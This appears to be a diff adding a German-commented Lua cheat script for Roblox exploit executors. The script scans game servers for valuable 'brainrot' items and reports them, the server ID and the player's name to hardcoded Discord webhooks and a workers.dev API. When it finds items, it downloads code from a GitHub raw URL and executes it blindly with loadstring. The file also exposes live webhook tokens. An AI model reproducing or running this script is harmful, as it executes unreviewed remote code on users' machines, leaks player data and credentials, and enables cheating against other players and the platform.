@@ -1,0 +1,288 @@
+-- ============================================================
+-- ROBLOX BRAINROT TRACKER + API + AUTO HOPPER - FINAL VERSION
+-- ============================================================
+
+local WEBHOOKS = {
+    ["10m+"] = "https://ptb.discord.com/api/webhooks/1466150960631124077/uSYu5q9WRgbVGc--fYMh8v8oKv8px-6fKsshPhXUPRuejrXRX3fBUnAVenmv792iAdLw",
+    ["50m+"] = "https://ptb.discord.com/api/webhooks/1466151003249446953/ptYOg2FccEIbO45D7jEtxV0DLSTUjsZ7Wk_P_jcANpgMq14qKJfspx1RpdCGgh_Jom23",
+    ["100m+"] = "https://ptb.discord.com/api/webhooks/1466151038016028793/9Af0juhrAtmIMPt2JcfPy2Yjqd01VemE6-Il8NH3--0XDICoW17BLz7VOWYZ9XKWj_-f",
+    ["500m+"] = "https://discord.com/api/webhooks/1466151077438033962/2id4dQig9N_7FK-X9rtNGNYRWjv_PXMGSiIwN-lQ36AAqGDYlrB8u_A_k7R2qGWPH04a",
+    ["1b+"] = "https://discord.com/api/webhooks/1466151123944472597/CtZbm3U3Lsi1TGdOfLPqGziF_0xpZ-cWMqXupUeE3-YEF-BcpJufH5PUBFFlSborgzM"
+}
+
+local HIGHLIGHTS_URL = "https://discord.com/api/webhooks/1466088189260468458/Vi19cPhLJXGckt_0IDjRa6MkGixFznByJ_0BlNmKx0h84VlBgJtrPmtHWmbDHiW3eOPe"
+local API_URL = "https://nameless-river-7226.therixyt4.workers.dev/brainrots"
+local MIN_VAL = 10000000
+
+local HS = game:GetService("HttpService")
+local P = game:GetService("Players")
+
+-- ===== REQUEST FUNCTION =====
+print("[1] Suche Request-Funktion...")
+local requestFunc = nil
+
+if syn and syn.request then
+    requestFunc = syn.request
+    print("[✓] Synapse X Request gefunden")
+elseif http and http.request then
+    requestFunc = http.request
+    print("[✓] HTTP Library gefunden")
+elseif request then
+    requestFunc = request
+    print("[✓] Standard Request gefunden")
+elseif fluxus and fluxus.request then
+    requestFunc = fluxus.request
+    print("[✓] Fluxus Request gefunden")
+elseif getgenv and getgenv().request then
+    requestFunc = getgenv().request
+    print("[✓] getgenv Request gefunden")
+elseif http_request then
+    requestFunc = http_request
+    print("[✓] http_request gefunden")
+else
+    print("[❌] KEINE REQUEST FUNKTION GEFUNDEN!")
+end
+
+local function parse(t)
+    if not t then return 0 end
+    local n = tonumber(t:match("[%d%.]+")) or 0
+    if t:find("B") then return n * 1e9 end
+    if t:find("M") then return n * 1e6 end
+    if t:find("K") then return n * 1e3 end
+    return n
+end
+
+local function getCategory(value)
+    if value >= 1000000000 then return "1b+"
+    elseif value >= 500000000 then return "500m+"
+    elseif value >= 100000000 then return "100m+"
+    elseif value >= 50000000 then return "50m+"
+    elseif value >= 10000000 then return "10m+"
+    else return "HIGHLIGHTS" end
+end
+
+-- ===== SEND TO API =====
+local function sendToAPI(brainrot, category)
+    if not requestFunc then 
+        print("[❌ API] ABGEBROCHEN: Keine Request-Funktion")
+        return 
+    end
+    
+    local now = os.date("*t")
+    local zeitString = string.format("%02d/%02d/%04d %02d:%02d:%02d", 
+        now.day, now.month, now.year, now.hour, now.min, now.sec)
+    
+    local message = string.format(
+        "🧠 HIGHLIGHTS BRAINROT!\r\n\n%s wurde entdeckt!\r\n💰 WERT\n%s\r\n🏷️ KATEGORIE\n%s\r\n🎮 JOB ID\n%s\r\n",
+        brainrot.name,
+        brainrot.gen,
+        category,
+        game.JobId
+    )
+    
+    local playerName = P.LocalPlayer and P.LocalPlayer.Name or "Unknown"
+    local placeId = tostring(game.PlaceId)
+    
+    local apiData = {
+        zeit = zeitString,
+        spieler = playerName,
+        game_id = placeId,
+        nachricht = message
+    }
+    
+    local jsonSuccess, jsonData = pcall(function()
+        return HS:JSONEncode(apiData)
+    end)
+    
+    if not jsonSuccess then
+        print("[❌ API] JSON Encoding Fehler:", jsonData)
+        return
+    end
+    
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = API_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Accept"] = "application/json"
+            },
+            Body = jsonData
+        })
+    end)
+    
+    if success and response and response.StatusCode == 200 then
+        print("[✅ API] Gesendet:", brainrot.name, "|", brainrot.gen)
+    end
+end
+
+-- ===== SEND TO WEBHOOKS =====
+local function sendToValueWebhooks(value, brainrot)
+    local webhookKey = ""
+    
+    if value >= 1000000000 then webhookKey = "1b+"
+    elseif value >= 500000000 then webhookKey = "500m+"
+    elseif value >= 100000000 then webhookKey = "100m+"
+    elseif value >= 50000000 then webhookKey = "50m+"
+    elseif value >= 10000000 then webhookKey = "10m+" end
+    
+    if webhookKey ~= "" and WEBHOOKS[webhookKey] then
+        local embed = {
+            title = brainrot.name .. " (" .. brainrot.gen .. ")",
+            description = "**Value:** " .. brainrot.gen .. "\n**Server ID:** " .. game.JobId .. "\n**Timestamp:** " .. os.date("%d/%m/%Y %H:%M:%S"),
+            color = 5814783,
+            footer = {text = webhookKey .. " Brainrot Found!"}
+        }
+        
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOKS[webhookKey],
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode({embeds = {embed}})
+            })
+        end)
+        
+        print("[✓ Webhook]", webhookKey)
+    end
+end
+
+-- ===== SEND SINGLE HIGHLIGHT EMBED =====
+local function sendHighlightsEmbed(foundBrainrots)
+    if #foundBrainrots == 0 then return end
+    
+    table.sort(foundBrainrots, function(a, b) return a.value > b.value end)
+    
+    -- Nehme das wertvollste Brainrot als Haupt-Titel
+    local mainBrainrot = foundBrainrots[1]
+    local description = ""
+    
+    -- Zeige andere Brainrots in der Description (falls vorhanden)
+    if #foundBrainrots > 1 then
+        description = "📊 **Other Brainrots**\n"
+        for i = 2, #foundBrainrots do
+            description = description .. "1x " .. foundBrainrots[i].name .. " (" .. foundBrainrots[i].gen .. ")\n"
+        end
+        description = description .. "\n"
+    end
+    
+    -- Füge Zeitstempel hinzu
+    description = description .. os.date("%d/%m/%Y %H:%M")
+    
+    local embed = {
+        title = mainBrainrot.name .. " (" .. mainBrainrot.gen .. ")",
+        description = description,
+        color = 16750848,  -- Orange Farbe wie im Bild
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+    }
+    
+    local success = pcall(function()
+        requestFunc({
+            Url = HIGHLIGHTS_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HS:JSONEncode({
+                content = "",
+                embeds = {embed}
+            })
+        })
+    end)
+    
+    if success then
+        print("[✓ Highlights] 1 Embed gesendet:", mainBrainrot.name)
+    end
+end
+
+-- ===== SCAN FUNCTION =====
+local function scan()
+    print("\n[🔍] Starte Scan...")
+    
+    local foundBrainrots = {}
+    local scanCount = 0
+    
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj.Name == "Generation" and obj:IsA("TextLabel") then
+            scanCount = scanCount + 1
+            local genText = obj.Text
+            local value = parse(genText)
+            
+            if value >= MIN_VAL then
+                local parent = obj.Parent
+                local name = "Unknown Brainrot"
+                
+                if parent and parent:FindFirstChild("DisplayName") then
+                    local displayName = parent.DisplayName
+                    if displayName:IsA("TextLabel") then
+                        name = displayName.Text
+                    end
+                end
+                
+                local brainrot = {
+                    name = name,
+                    gen = genText,
+                    value = value
+                }
+                
+                table.insert(foundBrainrots, brainrot)
+                
+                local category = getCategory(value)
+                
+                print("[🎯] GEFUNDEN:", name, "|", genText, "|", category)
+                
+                -- Nur Value Webhooks hier (10m+, 50m+, etc.)
+                sendToValueWebhooks(value, brainrot)
+            end
+        end
+    end
+    
+    print("[📊] Scan fertig:", #foundBrainrots, "Brainrots gefunden")
+    
+    if #foundBrainrots > 0 then
+        -- Sortiere und nimm das wertvollste für API
+        table.sort(foundBrainrots, function(a, b) return a.value > b.value end)
+        local mainBrainrot = foundBrainrots[1]
+        local category = getCategory(mainBrainrot.value)
+        
+        -- NUR 1x API Call mit dem wertvollsten Brainrot
+        sendToAPI(mainBrainrot, category)
+        
+        -- Sende ein einziges Highlights Embed
+        print("[📤] Sende Highlights Embed...")
+        sendHighlightsEmbed(foundBrainrots)
+        
+        print("[⚡] Starte Hopper SOFORT...")
+        
+        local success, hopper = pcall(function()
+            return game:HttpGet("https://raw.githubusercontent.com/therix300-source/joiner/refs/heads/main/joiner")
+        end)
+        
+        if success and hopper then
+            pcall(loadstring(hopper))
+            print("[✓] Hopper geladen")
+        end
+    end
+end
+
+-- ===== MAIN =====
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+print("\n" .. string.rep("=", 50))
+print("   🧠 BRAINROT TRACKER - SPEED VERSION   ")
+print(string.rep("=", 50))
+print("📡 API:", API_URL)
+print("🎮 Place:", game.PlaceId)
+print("🆔 Job:", game.JobId)
+print("👤 Player:", P.LocalPlayer.Name)
+print(string.rep("=", 50))
+
+-- Sofortiger Scan ohne Verzögerung
+scan()
+
+-- Automatischer Rescan alle 10 Sekunden
+while true do
+    task.wait(10)
+    print("\n[🔄] Rescan...")
+    scan()
+end
